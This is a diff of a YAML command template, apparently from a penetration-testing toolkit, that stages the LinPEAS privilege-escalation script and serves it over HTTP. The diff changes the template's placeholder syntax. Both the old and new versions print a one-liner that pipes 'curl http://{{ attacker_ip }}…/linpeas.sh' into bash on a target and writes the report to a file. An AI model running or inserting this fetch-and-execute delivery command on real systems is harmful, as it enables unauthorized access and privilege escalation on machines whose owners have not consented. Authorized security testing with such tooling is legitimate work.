@@ -1,14 +1,15 @@
----
 metadata:
-  filename: "deliver-linux-linPEAS.yaml"
-  tags: ["system", "linux", "privesc"]
-  created: "2025-03-29"
-  author: "Unknown"
-
-content: |
-  mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/linpeas/* packstation/outbound/; \
-  echo '================================================================'; \
-  echo '                       -----Linux------                         '; \
-  echo 'Deliver & execute: curl http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/linpeas.sh | bash > <%=$(esh variables/delivery_path_linux)%>/report.txt'; \
-  echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  filename: deliver-linux-linPEAS.yaml
+  tags:
+  - system
+  - linux
+  - privesc
+  created: '2025-03-29'
+  author: Unknown
+content: "mkdir -p packstation/outbound; cp -n {{ tools_dir }}/linpeas/* packstation/outbound/;\
+  \ \\\necho '================================================================'; \\\
+  \necho '                       -----Linux------                         '; \\\n\
+  echo 'Deliver & execute: curl http://{{ attacker_ip }}:{{ delivery_outbound_port\
+  \ }}/linpeas.sh | bash > {{ delivery_path_linux }}/report.txt'; \\\necho '================================================================';\
+  \ \\\n python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{\
+  \ delivery_outbound_port }} -d packstation/outbound\n"
